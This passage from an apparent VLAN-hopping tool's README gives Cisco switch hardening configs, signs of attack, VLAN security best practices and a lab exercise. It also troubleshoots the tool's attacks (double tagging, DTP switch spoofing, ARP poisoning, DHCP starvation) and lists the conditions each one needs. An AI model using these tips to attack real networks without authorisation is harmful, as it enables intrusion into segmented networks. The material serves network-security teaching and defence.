     match ip address HOP-TRAFFIC
     action drop
   ```

4. **Port Security**:
   ```cisco
   interface GigabitEthernet0/1
     switchport port-security
     switchport port-security maximum 1
     switchport port-security violation shutdown
   ```

5. **Disable Unused Ports**:
   ```cisco
   interface range GigabitEthernet0/2-24
     shutdown
   ```

### Signs of Attack:
- Unexpected DTP negotiations
- Double-tagged frames on access ports
- Traffic from unexpected VLANs
- ARP responses from multiple VLANs
- DHCP requests from wrong VLANs

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "Operation not permitted" | Run as root (sudo) |
| No double-tag responses | Check native VLAN configuration |
| DTP not working | Switch may have DTP disabled |
| ARP poisoning fails | Target may have ARP protection |
| DHCP starvation slow | Reduce rate, increase count |
| No VLANs discovered | Target VLANs may be filtered |

## Network Requirements

### For Double Tagging:
- Switch strips only outer tag
- Native VLAN = attacker's VLAN
- Switch forwards to trunk

### For Switch Spoofing:
- DTP enabled on port
- Port in dynamic desirable/auto mode
- No port security

## VLAN Security Best Practices

1. **Never use VLAN 1 as native** (change to unused VLAN)
2. **Disable DTP on all access ports**
3. **Use private VLANs** for additional isolation
4. **Implement DHCP snooping** across VLANs
5. **Enable ARP inspection** on all VLANs
6. **Monitor for double-tagged frames**
7. **Regular VLAN audits**

## Educational Use

This tool is excellent for learning about:
- VLAN technology and 802.1Q
- Network segmentation bypass techniques
- Switch protocol exploitation (DTP)
- Cross-VLAN attack vectors
- Network security defense mechanisms

## Mitigation Lab Exercise

To test defenses:
1. Set up VLANs on managed switch
2. Configure DTP on some ports
3. Implement security features
4. Attempt VLAN hopping attacks
5. Observe which techniques work
6. Harden configuration based on findings
